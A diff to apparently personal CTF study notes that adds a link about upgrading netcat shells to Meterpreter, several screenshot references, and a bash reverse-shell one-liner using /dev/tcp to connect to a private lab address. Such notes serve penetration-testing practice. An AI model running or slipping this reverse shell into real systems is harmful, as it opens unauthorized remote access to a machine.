@@ -50,4 +50,8 @@ https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privil
 https://www.exploit-db.com/exploits/42274
 
 
-![[Pasted image 20250117232339.png]]
+https://www.puckiestyle.nl/upgrading-netcat-shells-to-meterpreter-sessions/
+`bash -i> /dev/tcp/192.168.15.4/6969 0>&1`
+![[Pasted image 20250117234351.png]]
+![[Pasted image 20250117234356.png]]
+![[Pasted image 20250117234535.png]]
